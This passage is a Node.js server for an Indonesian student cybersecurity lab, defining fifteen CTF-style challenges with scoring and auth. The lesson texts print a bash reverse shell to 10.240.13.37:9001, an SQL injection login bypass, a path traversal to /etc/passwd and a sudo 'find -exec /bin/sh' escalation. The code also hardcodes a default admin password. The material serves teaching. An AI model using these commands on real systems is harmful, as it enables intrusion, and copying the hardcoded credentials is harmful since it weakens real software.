const http=require('http'),https=require('https'),fs=require('fs'),path=require('path'),crypto=require('crypto');
const isVercel=Boolean(process.env.VERCEL||process.env.AWS_LAMBDA_FUNCTION_NAME);
const ROOT=path.join(__dirname,'public');
const DATA_DIR=isVercel?path.join('/tmp','cyberlab-data'):path.join(__dirname,'data');
const DATA_FILE=path.join(DATA_DIR,'progress.json');
const SUPABASE_CONFIG_FILE=path.join(DATA_DIR,'supabase_config.json');

try{
  if(!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR,{recursive:true});
}catch(e){
  console.warn('mkdir DATA_DIR warning:',e.message);
}

// Inisialisasi berkas progres awal di serverless / Vercel
if(isVercel){
  const localInitial=path.join(__dirname,'data','progress.json');
  try{
    if(fs.existsSync(localInitial)&&!fs.existsSync(DATA_FILE)){
      fs.copyFileSync(localInitial,DATA_FILE);
    }
  }catch{}
}

// Konfigurasi Admin Default (dapat diubah via setting)
const ADMIN_SECRET=process.env.ADMIN_PASSWORD||'guru2026';

// 15 KASUS BERJENJANG DARI TINGKAT DASAR (LOW), MENENGAH (MEDIUM), HINGGA TINGGI (HIGH)
// Dipetakan ke Pilar Kurikulum TJKT: Linux, Jaringan, Cyber (Web/Kripto), Hardware
const baseChallenges=[
  // ==================== TINGKAT DASAR (LOW / FONDASE TJKT - 100 XP) ====================
  {
    id:1,
    topic:'Linux Dasar',
    category:'Linux',
    title:'Orientasi Direktori Aktif (pwd)',
    difficulty:'Dasar (Low)',
    points:100,
    summary:'Mengetahui direktori kerja aktif dan struktur pohon sistem berkas Linux.',
    lesson:'Dalam sistem operasi Linux, seluruh berkas dan folder berakar pada direktori root (/). Saat teknisi atau administrator masuk ke terminal shell, perintah pertama yang mutlak dijalankan adalah orientasi posisi (pwd - print working directory) agar mengetahui lokasi kerja dan tidak keliru mengeksekusi instruksi.',
    details:[
      {title:'Konsep Dasar Hirarki Linux',content:'Linux tidak mengenal drive C: atau D:. Seluruh partisi dan perangkat dimount ke dalam satu pohon tunggal di bawah root (/).'},
      {title:'Perintah Kunci Navigasi',content:'<code>pwd</code> mencetak direktori aktif saat ini. <code>cd &lt;tujuan&gt;</code> untuk berpindah direktori, dan <code>cd ~</code> untuk kembali ke folder home pengguna.'},
      {title:'Penerapan Nyata di TJKT',content:'Memastikan posisi folder sebelum menjalankan skrip backup atau konfigurasi server Apache/Nginx agar tidak salah menimpa berkas sistem.'}
    ],
    audioText:'Kasus satu Linux Dasar: Orientasi Direktori Aktif. Perintah p w d adalah singkatan dari print working directory. Gunakan perintah ini di terminal lab untuk menemukan path direktori aktif saat ini.',
    task:'Buka terminal simulasi, jalankan perintah pwd. Apakah path direktori kerja tempat Anda berada saat ini?',
    answers:['/home/student'],
    hint:'Ketik pwd pada terminal simulasi.',
    explain:'pwd menampilkan path direktori kerja absolut pengguna yang sedang aktif, yaitu /home/student.'
  },
  {
    id:2,
    topic:'Linux Dasar',
    category:'Linux',
    title:'Menemukan Berkas Tersembunyi (ls -la)',
    difficulty:'Dasar (Low)',
    points:100,
    summary:'Mendeteksi dotfiles (berkas tersembunyi) yang diawali tanda titik.',
    lesson:'Di Linux, berkas yang namanya diawali karakter titik (.) disembunyikan oleh sistem dari daftar standar perintah ls. Untuk melihat seluruh berkas termasuk berkas tersembunyi dan atribut perizinannya, gunakan opsi kombinasi ls -la.',
    details:[
      {title:'Format ls -la',content:'Opsi <code>-a</code> (all) menampilkan file berawalan titik. Opsi <code>-l</code> (long) menampilkan izin rwx, pemilik, ukuran, dan tanggal.'},
      {title:'Penerapan Nyata di TJKT',content:'Administrator dan penyerang sama-sama sering menyimpan konfigurasi sensitif atau kunci privat di file tersembunyi (seperti .bash_history, .ssh/id_rsa, .env).'}
    ],
    audioText:'Kasus dua Linux Dasar: Berkas Tersembunyi. Jalankan perintah l s spasi minus l a di terminal untuk melihat seluruh berkas tersembunyi yang diawali karakter titik.',
    task:'Jalankan ls -la di terminal simulasi. Apa nama file tersembunyi (dotfile) yang ditemukan di folder aktif?',
    answers:['.secret'],
    hint:'Cari nama berkas yang diawali tanda titik (.) pada hasil ls -la.',
    explain:'Berkas .secret adalah berkas tersembunyi yang hanya terlihat saat menggunakan parameter -a pada perintah ls.'
  },
  {
    id:3,
    topic:'Linux Dasar',
    category:'Linux',
    title:'Membaca Konfigurasi Server (cat)',
    difficulty:'Dasar (Low)',
    points:100,
    summary:'Membaca berkas teks konfigurasi sistem tanpa editor teks menggunakan utilitas cat.',
    lesson:'Utilitas cat (concatenate) digunakan untuk membaca seluruh isi berkas teks dan mengalirkannya langsung ke terminal. Sebagian besar konfigurasi server Linux (seperti /etc/network/interfaces atau /etc/resolv.conf) berformat teks biasa.',
    details:[
      {title:'Utilitas Pembaca Teks',content:'Gunakan <code>cat nama_file</code> untuk membaca langsung. Untuk menyaring baris tertentu, gabungkan dengan pipa: <code>cat config.txt | grep MODE</code>.'},
      {title:'Penerapan Nyata di TJKT',content:'Memeriksa setelan IP, netmask, gateway, dan status firewall pada berkas konfigurasi Debian/Ubuntu Server.'}
    ],
    audioText:'Kasus tiga Linux Dasar: Membaca Konfigurasi Server. Jalankan perintah c a t spasi config titik t x t di terminal. Cari nilai dari variabel M O D E.',
    task:'Jalankan cat config.txt di terminal simulasi. Apakah nilai dari variabel MODE?',
    answers:['defensive'],
    hint:'Perhatikan baris MODE=... pada hasil pembacaan config.txt.',
    explain:'cat config.txt menampilkan konfigurasi sistem di mana MODE bernilai "defensive".'
  },
  {
    id:4,
    topic:'Jaringan Dasar',
    category:'Jaringan',
    title:'Analisis Port Protokol Remote (SSH)',
    difficulty:'Dasar (Low)',
    points:100,
    summary:'Mengenal nomor port standar IANA untuk protokol remote shell terenkripsi.',
    lesson:'Port jaringan 16-bit (0-65535) memetakan paket transport layer TCP/UDP ke proses layanan server. Port 0-1023 adalah Well-Known Ports standar IANA. Protokol Secure Shell (SSH) menggunakan enkripsi kriptografis untuk administrasi jarak jauh menggantikan Telnet.',
    details:[
      {title:'Port Standar Populer TJKT',content:'Port 22 (SSH), Port 53 (DNS), Port 80 (HTTP), Port 443 (HTTPS), Port 21 (FTP).'},
      {title:'Penerapan Nyata di TJKT',content:'Konfigurasi remote server Ubuntu menggunakan PuTTY atau terminal SSH, serta pengaturan port forwarding pada router Mikrotik.'}
    ],
    audioText:'Kasus empat Jaringan Dasar: Analisis Port Layanan Remote. Berapakah nomor port standar T C P yang digunakan oleh layanan Secure Shell S S H?',
    task:'Berapakah nomor port TCP standar yang dialokasikan oleh IANA untuk layanan Secure Shell (SSH)?',
    answers:['22'],
    hint:'Merupakan angka dua digit di bawah angka 30.',
    explain:'Port TCP 22 adalah port standar internasional untuk layanan remote SSH terenkripsi.'
  },
  {
    id:5,
    topic:'Kripto Dasar',
    category:'Cyber',
    title:'Rekayasa Balik Encoding (Base64 Decode)',
    difficulty:'Dasar (Low)',
    points:100,
    summary:'Membedakan proses encoding dengan enkripsi dan memecahkan representasi Base64.',
    lesson:'Base64 adalah teknik binary-to-text encoding 64-karakter untuk mentransmisikan data biner melalui kanal teks (seperti email MIME atau HTTP header). Base64 BUKAN enkripsi karena proses decode tidak membutuhkan kunci rahasia.',
    details:[
      {title:'Encoding vs Enkripsi',content:'Encoding bersifat publik tanpa kunci rahasia. Enkripsi menjamin kerahasiaan data dan mutlak membutuhkan kunci rahasia (secret key).'},
      {title:'Penerapan Nyata di TJKT',content:'Pengiriman kredensial HTTP Basic Auth dan token API sering di-encode Base64 sehingga wajib dilapisi protokol HTTPS.'}
    ],
    audioText:'Kasus lima Kriptografi Dasar: Decode Base64. Jalankan perintah decode spasi Q 1 R G di terminal simulasi untuk menemukan teks aslinya.',
    task:'Di terminal simulasi, jalankan perintah: decode Q1RG. Apakah teks asli hasil decode Base64 tersebut?',
    answers:['CTF'],
    hint:'Terdiri dari 3 huruf kapital singkatan Capture The Flag.',
    explain:'String Q1RG dalam representasi Base64 diterjemahkan kembali menjadi kata "CTF".'
  },

  // ==================== TINGKAT MENENGAH (MEDIUM / TJKT ADM & WEB - 150 - 200 XP) ====================
  {
    id:6,
    topic:'Linux / PrivEsc',
    category:'Linux',
    title:'Jejak Izin Berbahaya (SUID Bit)',
    difficulty:'Sedang (Medium)',
    points:150,
    summary:'Menemukan biner berizin SUID kustom yang memungkinkan eskalasi hak akses root.',
    lesson:'Bit perizinan SUID (SetUID, nilai oktal 4000) mengizinkan file dieksekusi dengan privilese pemilik berkas (root). Jika binary kustom memiliki bit SUID aktif, penyerang dapat memanfaatkannya untuk privilege escalation menjadi root.',
    details:[
      {title:'Pencarian Biner SUID',content:'Perintah: <code>find / -perm -u=s -type f 2>/dev/null</code> menyaring berkas berizin SUID di sistem Linux.'},
      {title:'Penerapan Nyata di TJKT',content:'Auditing keamanan server Linux pasca-instalasi aplikasi untuk memastikan tidak ada biner kustom yang salah diberi izin chmod u+s.'}
    ],
    audioText:'Kasus enam Linux Privilege Escalation: SUID Bit. Cari berkas SUID di direktori slash usr slash local slash bin. Temukan biner kustom yang mencurigakan.',
    task:'Jalankan find / -perm -u=s -type f 2>/dev/null atau periksa /usr/local/bin di terminal. Apa nama berkas binary kustom ber-SUID yang ditemukan?',
    answers:['backup-tool','/usr/local/bin/backup-tool'],
    hint:'Periksa isi folder /usr/local/bin dengan perintah ls -la /usr/local/bin.',
    explain:'/usr/local/bin/backup-tool memiliki izin SUID root (-rwsr-xr-x) yang berpotensi dieksploitasi untuk meraih akses root.'
  },
  {
    id:7,
    topic:'Web / Auth',
    category:'Cyber',
    title:'Cookie yang Terlalu Percaya Diri',
    difficulty:'Sedang (Medium)',
    points:150,
    summary:'Manipulasi status peran akun pada cookie otorisasi berbasis Base64 JSON.',
    lesson:'Aplikasi web yang menyimpan status otentikasi di cookie peramban tanpa digital signature (HMAC) rentan terhadap client-side tampering. Penyerang cukup mendecode cookie, mengubah parameter role/admin, lalu mengirimkannya kembali ke server.',
    details:[
      {title:'Inspeksi Header HTTP',content:'Gunakan <code>curl -i http://api.toko.lab/profile</code> untuk memeriksa Cookie sesi pengguna.'},
      {title:'Penerapan Nyata di TJKT',content:'Memahami cara kerja autentikasi JWT (JSON Web Token) dan session cookie yang aman pada layanan web server.'}
    ],
    audioText:'Kasus tujuh Keamanan Web: Cookie Tampering. Jalankan curl minus i http api toko lab profile di terminal, lalu decode cookie sesi yang ditemukan. Nilai boolean apa yang harus diisikan pada parameter admin agar mendapat akses penuh?',
    task:'Jalankan curl -i http://api.toko.lab/profile di terminal, lalu decode cookie sesi yang ada. Nilai boolean apa yang harus diubah pada parameter "admin" agar akun menjadi administrator?',
    answers:['true','admin=true','admin: true'],
    hint:'Decode cookie sesi dengan perintah: decode <string>. Perhatikan parameter boolean admin.',
    explain:'Mengubah "admin": true memberikan akses administrator karena server tidak memverifikasi integritas cryptographic signature pada cookie.'
  },
  {
    id:8,
    topic:'Web / Injection',
    category:'Cyber',
    title:'Klausa SQL yang Selalu Benar (Auth Bypass)',
    difficulty:'Sedang (Medium)',
    points:150,
    summary:'Memotong verifikasi password pada form login menggunakan karakter komentar SQL.',
    lesson:'SQL Injection terjadi saat input pengguna digabungkan langsung secara mentah ke kueri database (string concatenation). Penyerang menyisipkan logika tautologi (OR 1=1) dan karakter komentar untuk membuang pemeriksaan password.',
    details:[
      {title:'Karakter Komentar Database',content:'Dua tanda hubung (<code>--</code>) atau tanda pagar (<code>#</code>) pada MySQL/SQLite menonaktifkan sisa baris kueri SQL.'},
      {title:'Penerapan Nyata di TJKT',content:'Mengamankan backend web database PHP/Node.js dengan Prepared Statements dan Parameterized Queries.'}
    ],
    audioText:'Kasus delapan Keamanan Web: SQL Injection. Karakter komentar apakah yang digunakan di akhir payload SQLi untuk membatalkan pemeriksaan password?',
    task:'Karakter penanda komentar apakah yang digunakan di akhir payload SQL injection (contoh: admin\' OR 1=1 ...) untuk menonaktifkan sisa kueri password pada MySQL/SQLite?',
    answers:['--','#','-- -','-- '],
    hint:'Dua tanda minus/hubung berturut-turut atau tanda pagar.',
    explain:'Tanda dua minus (--) adalah sintaks komentar standar SQL yang membatalkan eksekusi sisa kueri password.'
  },
  {
    id:9,
    topic:'Web / LFI',
    category:'Cyber',
    title:'Menembus Batas Direktori Web (Path Traversal)',
    difficulty:'Sedang (Medium)',
    points:150,
    summary:'Menghitung langkah mundur direktori ../ untuk membaca berkas rahasia /etc/passwd.',
    lesson:'Path Traversal memungkinkan penyerang keluar dari direktori webroot publik dan membaca berkas internal sistem operasi menggunakan sekuens dot-dot-slash (../) karena kurangnya sanitasi input pada fungsi file inclusion.',
    details:[
      {title:'Perhitungan Jalur Relatif',content:'Dari <code>/var/www/html/</code>: langkah 1 ke <code>/var/www/</code>, langkah 2 ke <code>/var/</code>, langkah 3 mencapai root <code>/</code>.'},
      {title:'Penerapan Nyata di TJKT',content:'Konfigurasi open_basedir pada web server Apache/Nginx untuk mengurung proses web di direktori dokumen publik saja.'}
    ],
    audioText:'Kasus sembilan Web Security: Path Traversal. Berapa kali sekuens titik-titik-garis miring minimal dari folder var www html untuk mencapai root dan membaca berkas etc passwd?',
    task:'Jika webroot berada di /var/www/html/, berapa kali sekuens "../" minimal yang harus disisipkan penyerang agar mencapai direktori root "/" dan membaca /etc/passwd?',
    answers:['3','tiga','3 kali'],
    hint:'Hitung kedalaman folder: dari /var/www/html menuju / memerlukan 3 kali mundur folder.',
    explain:'Dari /var/www/html/ dibutuhkan 3 kali ../ (langkah: /var/www/ -> /var/ -> /) sehingga payload ../../../etc/passwd sukses membaca berkas sistem.'
  },
  {
    id:10,
    topic:'Kriptografi / Hash',
    category:'Cyber',
    title:'Meruntuhkan Hash Tanpa Salt (Rainbow Table)',
    difficulty:'Sedang (Medium)',
    points:200,
    summary:'Memecahkan hash kata sandi MD5 tanpa salt hasil kebocoran database menggunakan kamus.',
    lesson:'Fungsi hash MD5 bersifat satu arah, namun karena tanpa salt unik, nilai hash dari kata sandi populer bersifat deterministik dan telah terindeks pada tabel prekomputasi (Rainbow Table). Mengamankan password wajib menggunakan algoritma lambat seperti bcrypt/Argon2 dengan salt acak.',
    details:[
      {title:'Inspeksi Berkas Bocor',content:'Jalankan <code>cat leak.txt</code> di terminal untuk menemukan hash akun administrator.'},
      {title:'Penerapan Nyata di TJKT',content:'Manajemen otentikasi pengguna di sistem Linux (/etc/shadow menggunakan hash SHA-512 dengan salt acak).'}
    ],
    audioText:'Kasus sepuluh Kriptografi: Hash MD5 Tanpa Salt. Jalankan cat spasi leak titik t x t di terminal. Pecahkan hash MD5 milik akun admin.',
    task:'Jalankan cat leak.txt di terminal simulasi. Temukan hash MD5 akun admin: 5f4dcc3b5aa765d61d8327deb882cf99. Apakah kata sandi teks asli (plaintext) dari hash tersebut?',
    answers:['password'],
    hint:'Salah satu kata sandi paling populer di dunia dalam bahasa Inggris (8 huruf).',
    explain:'5f4dcc3b5aa765d61d8327deb882cf99 adalah representasi hash MD5 dari kata sandi "password".'
  },

  // ==================== TINGKAT MAHIR (HIGH / HARD / ADVANCED TJKT - 200 - 250 XP) ====================
  {
    id:11,
    topic:'Jaringan / Firewall',
    category:'Jaringan',
    title:'Ketukan Rahasia di Pintu Jaringan (Port Knocking)',
    difficulty:'Sulit (High)',
    points:200,
    summary:'Menganalisis log firewall untuk mengungkap sekuens ketukan port tersembunyi.',
    lesson:'Port Knocking melindungi port sensitif (seperti SSH) dengan menutupnya di firewall secara default. Port hanya akan dibuka dinamis oleh daemon iptables/knockd setelah klien mengirim paket TCP SYN ke urutan port tertutup tertentu dalam jeda waktu singkat.',
    details:[
      {title:'Analisis Paket Log',content:'Jalankan <code>cat knock.log</code> di terminal untuk menganalisis urutan DPT (Destination Port) dari IP terpercaya.'},
      {title:'Penerapan Nyata di TJKT',content:'Konfigurasi Firewall Raw / Port Knocking di router Mikrotik RouterOS untuk melindungi akses remote Winbox/SSH.'}
    ],
    audioText:'Kasus sebelas Keamanan Jaringan: Port Knocking. Jalankan cat knock titik log di terminal. Temukan urutan 3 nomor port ketukan TCP yang dikirim sebelum port 22 dibuka.',
    task:'Jalankan cat knock.log di terminal simulasi. Tuliskan urutan 3 nomor port ketukan (TCP DPT) yang dikirim IP 10.10.0.5 sebelum port 22 SSH terbuka! (Format: port1,port2,port3)',
    answers:['7005,8042,9110','7005, 8042, 9110','7005 8042 9110'],
    hint:'Periksa 3 baris sebelum baris OPEN - SSH ESTABLISHED pada knock.log.',
    explain:'Log mencatat IP 10.10.0.5 mengirim paket ke DPT=7005, DPT=8042, lalu DPT=9110 sebelum port 22 SSH berhasil dibuka.'
  },
  {
    id:12,
    topic:'Kriptoanalisis',
    category:'Cyber',
    title:'Kunci Rahasia di Balik XOR (Known Plaintext)',
    difficulty:'Sulit (High)',
    points:200,
    summary:'Membongkar kunci enkripsi single-byte XOR menggunakan teknik Known Plaintext Attack.',
    lesson:'Operasi XOR bersifat komutatif dan reversibel: jika Cipher = Plain XOR Key, maka Key = Plain XOR Cipher. Jika penyerang mengetahui sedikit saja format awal dokumen (Known Plaintext), kunci enkripsi dapat dibongkar secara instan.',
    details:[
      {title:'Perhitungan XOR Bitwise',content:'Byte ciphertext pertama = <code>0x15</code>. Byte plaintext pertama = huruf "F" (<code>0x46</code>). Operasi: <code>0x46 ^ 0x15 = 0x53</code> (desimal 83 / karakter ASCII "S").'},
      {title:'Penerapan Nyata di TJKT',content:'Analisis payload malware jaringan yang mengaburkan instruksi C2 menggunakan XOR sederhana.'}
    ],
    audioText:'Kasus dua belas Kriptoanalisis: Kunci XOR Cipher. Karakter pertama adalah 0x46 dan ciphertext 0x15. Hitung nilai kuncinya dengan operasi XOR.',
    task:'Jalankan cat cipher.hex di terminal. Byte pertama ciphertext adalah 0x15 dan karakter asli pertamanya adalah "F" (0x46). Hitung nilai kunci XOR: 0x46 XOR 0x15 = ? (Format: 0x.. atau desimal)',
    answers:['0x53','53','83','s','0x53h'],
    hint:'Hitung 0x46 (0100 0110) XOR 0x15 (0001 0101). Hasilnya adalah 0x53 (desimal 83).',
    explain:'0x46 XOR 0x15 = 0x53 (desimal 83 / karakter "S"). Kunci enkripsi berhasil dibongkar dengan Known Plaintext Attack.'
  },
  {
    id:13,
    topic:'Malware & Forensik',
    category:'Cyber',
    title:'Membedah Payload Obfuscation (Reverse Shell)',
    difficulty:'Sulit (High)',
    points:250,
    summary:'Mendekonstruksi skrip cronjob berbahaya untuk menemukan port command & control penyerang.',
    lesson:'Penyerang menanamkan cronjob persistensi di direktori sementara /var/tmp yang mengeksekusi reverse shell bash secara tersembunyi (obfuscated) menggunakan encoding Base64 yang dialirkan langsung ke memory interpreter.',
    details:[
      {title:'Anatomi Bash Reverse Shell',content:'Format: <code>sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> menghubungkan stdin/stdout terminal ke pendengar soket penyerang.'},
      {title:'Penerapan Nyata di TJKT',content:'Investigasi insiden peretasan server Linux, pemantauan koneksi keluar (egress filtering), dan audit crontab.'}
    ],
    audioText:'Kasus tiga belas Forensik Malware: Reverse Shell. Buka cat update titik s h dan decode string Base64 yang ditemukan. Berapakah port tujuan koneksi penyerang?',
    task:'Jalankan cat update.sh di terminal simulasi, lalu decode payload Base64 di dalamnya. Berapakah nomor port target (/dev/tcp/.../PORT) yang digunakan penyerang?',
    answers:['9001'],
    hint:'Gunakan perintah decode pada teks Base64 update.sh. Cari port di ujung /dev/tcp/.../PORT.',
    explain:'Payload Base64 diterjemahkan menjadi: sh -i >& /dev/tcp/10.240.13.37/9001 0>&1. Port 9001 adalah port netcat listener penyerang.'
  },
  {
    id:14,
    topic:'Hardware & IoT',
    category:'Hardware',
    title:'Penyadapan Serial Console Hardware (UART Baud Rate)',
    difficulty:'Sulit (High)',
    points:200,
    summary:'Menganalisis antarmuka komunikasi fisik serial UART pada router / perangkat embedded.',
    lesson:'UART (Universal Asynchronous Receiver-Transmitter) adalah antarmuka serial fisik pada PCB perangkat keras embedded/IoT yang menyediakan akses konsol root langsung. Karena asinkron tanpa clock terpisah, kecepatan Baud Rate wajib disinkronkan tepat agar karakter tidak rusak.',
    details:[
      {title:'Standar Kecepatan Baud Rate',content:'115200 bps adalah standar industri paling umum untuk antarmuka konsol bootloader Linux U-Boot dan kernel router.'},
      {title:'Penerapan Nyata di TJKT',content:'Konfigurasi kabel console RJ45-to-DB9/USB pada switch Cisco dan flashing firmware router OpenWrt.'}
    ],
    audioText:'Kasus empat belas Hardware Hacking: UART Baud Rate. Jalankan cat uart underscore config titik t x t. Berapakah standar baud rate enam digit paling umum untuk console serial Linux?',
    task:'Jalankan cat uart_config.txt di terminal simulasi. Berapakah angka standar baud rate 6-digit yang paling banyak digunakan pada konsol serial UART perangkat embedded Linux?',
    answers:['115200'],
    hint:'Angka enam digit dimulai dengan 115... yang sangat populer untuk serial console router.',
    explain:'115200 adalah standar baud rate de-facto untuk antarmuka konsol serial UART pada perangkat embedded dan router jaringan.'
  },
  {
    id:15,
    topic:'Linux Hardening',
    category:'Linux',
    title:'Celah GTFOBins pada Sudoers (PrivEsc)',
    difficulty:'Sulit (High)',
    points:250,
    summary:'Mengeksploitasi izin sudo tanpa password pada biner serbaguna menggunakan GTFOBins.',
    lesson:'Memberikan izin NOPASSWD pada biner serbaguna di /etc/sudoers (seperti find, vim, awk) adalah kesalahan konfigurasi fatal. Berdasarkan katalog GTFOBins, utilitas find memiliki parameter -exec yang dapat langsung mengeksekusi shell root interaktif.',
    details:[
      {title:'Investigasi sudo -l',content:'Perintah <code>sudo -l</code> menampilkan daftar instruksi yang dapat dijalankan sebagai root tanpa password.'},
      {title:'Penerapan Nyata di TJKT',content:'Prinsip Least Privilege dalam penyusunan aturan sudoers server produksi agar tidak memberikan hak berlebihan pada akun staf.'}
    ],
    audioText:'Kasus lima belas Linux Hardening: Celah GTFOBins Sudo. Jalankan sudo minus l di terminal. Opsi argumen apakah pada perintah find yang dapat mengeksekusi perintah shell eksternal?',
    task:'Jalankan sudo -l di terminal simulasi. Biner /usr/bin/find memiliki hak NOPASSWD root. Berdasarkan teknik GTFOBins, opsi parameter apakah pada utilitas find yang dapat mengeksekusi perintah eksternal (/bin/sh) untuk eskalasi hak akses?',
    answers:['-exec','exec'],
    hint:'Parameter pada perintah find untuk mengeksekusi aksi perintah pada berkas, diawali tanda minus.',
    explain:'Opsi -exec pada perintah find (contoh: sudo find . -exec /bin/sh -p \\;) mengeksekusi shell langsung dengan privilese root.'
  }
];

// Helper Database Lokal (Fallback jika Supabase offline/belum diset)
function readDB(){
  try{
    const raw=fs.readFileSync(DATA_FILE,'utf8');
    const parsed=JSON.parse(raw);
    parsed.users=parsed.users||{};
    parsed.challenges=parsed.challenges||[];
    parsed.solverHistory=parsed.solverHistory||{};
    parsed.examConfig=parsed.examConfig||{
      examMode:false,
      strictDynamic:false,
      timerMinutes:60,
      examEndTime:null,
      isExamLocked:false,
      dynamicScoring:true,
      maxBonusSolvers:5
    };
    return parsed;
  }catch{
    return {
      users:{},
      challenges:[],
      solverHistory:{},
      examConfig:{
        examMode:false,
        strictDynamic:false,
        timerMinutes:60,
        examEndTime:null,
        isExamLocked:false,
        dynamicScoring:true,
        maxBonusSolvers:5
      }
    };
  }
}

function writeDB(db){
  try{
    fs.writeFileSync(DATA_FILE,JSON.stringify(db,null,2));
  }catch(e){
    console.warn('Gagal menulis data lokal:', e.message);
  }
}

// Algoritma Pembuatan Flag Dinamis Unik per Siswa (Anti-Kecurangan Saat Ujian)
function getStudentDynamicFlag(studentName, challengeId){
  const secretSalt='TJKT_EXAM_SALT_2026';
  const hash=crypto.createHmac('sha256',secretSalt)
    .update(`${(studentName||'').trim().toLowerCase()}_${challengeId}`)
    .digest('hex')
    .slice(0,6)
    .toUpperCase();
  const cleanStudent=(studentName||'SISWA').replace(/[^a-zA-Z0-9]/g,'').toUpperCase().slice(0,8);
  return `FLAG{${challengeId}_${cleanStudent}_${hash}}`;
}

function readSupabaseConfig(){
  try{
    if(fs.existsSync(SUPABASE_CONFIG_FILE)){
      return JSON.parse(fs.readFileSync(SUPABASE_CONFIG_FILE,'utf8'));
    }
  }catch{}
  return {
    url: process.env.SUPABASE_URL || '',
    key: process.env.SUPABASE_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || '',
    enabled: !!(process.env.SUPABASE_URL && (process.env.SUPABASE_KEY || process.env.SUPABASE_ANON_KEY))
  };
}

function writeSupabaseConfig(cfg){
  try{
    fs.writeFileSync(SUPABASE_CONFIG_FILE,JSON.stringify(cfg,null,2));
  }catch(e){
    console.warn('Gagal menyimpan konfigurasi Supabase lokal:', e.message);
  }
}

// REST Client Bawaan Node.js untuk Komunikasi dengan Supabase (PostgREST)
async function supabaseRequest(endpoint, method='GET', bodyData=null){
  const cfg=readSupabaseConfig();
  if(!cfg.url || !cfg.key) throw new Error('Supabase URL atau API Key belum disetel.');
  
  const cleanUrl=cfg.url.replace(/\/$/,'');
  const fullUrl=`${cleanUrl}/rest/v1/${endpoint}`;
  const parsed=new URL(fullUrl);

  return new Promise((resolve,reject)=>{
    const headers={
      'apikey': cfg.key,
      'Authorization': `Bearer ${cfg.key}`,
      'Content-Type': 'application/json',
      'Prefer': endpoint.includes('on_conflict') ? 'resolution=merge-duplicates,return=representation' : 'return=representation'
    };
    const req=https.request({
      protocol: parsed.protocol,
      hostname: parsed.hostname,
      port: parsed.port||443,
      path: parsed.pathname + parsed.search,
      method,
      headers
    },(res)=>{
      let s='';
      res.on('data',chunk=>s+=chunk);
      res.on('end',()=>{
        try{
          const json=s?JSON.parse(s):{};
          if(res.statusCode>=200 && res.statusCode<300) resolve(json);
          else reject(new Error(json.message||json.error||`Supabase status ${res.statusCode}: ${s}`));
        }catch(e){
          if(res.statusCode>=200 && res.statusCode<300) resolve(s);
          else reject(new Error(`Supabase error ${res.statusCode}: ${s}`));
        }
      });
    });
    req.on('error',reject);
    if(bodyData) req.write(JSON.stringify(bodyData));
    req.end();
  });
}

// Mengambil Tantangan & Materi dari Database (Tersimpan & Bisa Diupdate)
function getAllChallenges(){
  const db=readDB();
  if(!Array.isArray(db.challenges) || db.challenges.length === 0){
    db.challenges = JSON.parse(JSON.stringify(baseChallenges));
    writeDB(db);
  }
  return db.challenges.sort((a,b)=>a.id-b.id);
}

function send(res,status,data,type='application/json; charset=utf-8'){
  res.writeHead(status,{
    'Content-Type':type,
    'X-Content-Type-Options':'nosniff',
    'Cache-Control':'no-store'
  });
  res.end(Buffer.isBuffer(data)||typeof data==='string'?data:JSON.stringify(data));
}

function body(req){
  return new Promise((resolve,reject)=>{
    let s='';
    req.on('data',c=>{
      s+=c;
      if(s.length>500000){reject(Error('Payload terlalu besar'));req.destroy();}
    });
    req.on('end',()=>{
      try{resolve(JSON.parse(s||'{}'));}catch{reject(Error('Format JSON tidak valid'));}
    });
    req.on('error',reject);
  });
}

function cleanName(s){
  return typeof s==='string'&&/^[\p{L}\p{N} _.-]{2,40}$/u.test(s.trim())?s.trim():null;
}

const APP_SECRET = process.env.APP_SECRET || (ADMIN_SECRET + '_app_salt_2026');
const sessions=new Map();
const adminSessions=new Set();

function hashPassword(pwd){
  if(!pwd) return '';
  return crypto.createHmac('sha256', APP_SECRET).update(String(pwd)).digest('hex');
}

function createStudentToken(name){
  const ts=Date.now();
  const sig=crypto.createHmac('sha256', APP_SECRET)
    .update(`student_${name}_${ts}`)
    .digest('hex');
  return `stu.${encodeURIComponent(name)}.${ts}.${sig}`;
}

function userFor(req){
  const auth=(req.headers.authorization||'').replace(/^Bearer /,'').trim();
  if(!auth) return null;
  if(sessions.has(auth)) return sessions.get(auth);
  
  const parts=auth.split('.');
  if(parts.length===4 && parts[0]==='stu'){
    const sName=decodeURIComponent(parts[1]);
    const ts=Number(parts[2]);
    const sig=parts[3];
    if(!isNaN(ts) && (Date.now() - ts < 30 * 24 * 3600 * 1000)){
      const expected=crypto.createHmac('sha256', APP_SECRET)
        .update(`student_${sName}_${ts}`)
        .digest('hex');
      if(crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))){
        sessions.set(auth, sName);
        return sName;
      }
    }
  }
  return null;
}

function createAdminToken(){
  const ts=Date.now();
  const sig=crypto.createHmac('sha256', ADMIN_SECRET)
    .update(`admin_${ts}`)
    .digest('hex');
  return `adm.${ts}.${sig}`;
}

function isAdmin(req){
  const auth=(req.headers.authorization||'').replace(/^Bearer /,'').trim();
  if(!auth) return false;
  if(adminSessions.has(auth)) return true;

  const parts=auth.split('.');
  if(parts.length===3 && parts[0]==='adm'){
    const ts=Number(parts[1]);
    const sig=parts[2];
    if(!isNaN(ts) && (Date.now() - ts < 7 * 24 * 3600 * 1000)){
      const expected=crypto.createHmac('sha256', ADMIN_SECRET)
        .update(`admin_${ts}`)
        .digest('hex');
      if(crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))){
        adminSessions.add(auth);
        return true;
      }
    }
  }
  return false;
}

// Kalkulasi Penilaian & Pemetaan Kompetensi TJKT
function calculateStudentAnalytics(db, challengesList){
  const results=[];
  const totalXP=challengesList.reduce((acc,c)=>acc+c.points,0);

  // Kategorisasi Soal
  const categories={
    Linux: challengesList.filter(c=>c.category==='Linux'),
    Jaringan: challengesList.filter(c=>c.category==='Jaringan'),
    Cyber: challengesList.filter(c=>c.category==='Cyber'),
    Hardware: challengesList.filter(c=>c.category==='Hardware')
  };

  for(const [name, p] of Object.entries(db.users)){
    const solvedIds=p.solved||[];
    const userScore=solvedIds.reduce((acc,id)=>{
      const c=challengesList.find(x=>x.id===id);
      return acc+(c?c.points:0);
    },0);

    // Hitung persentase kompetensi per pilar TJKT
    const linuxSolved=categories.Linux.filter(c=>solvedIds.includes(c.id)).length;
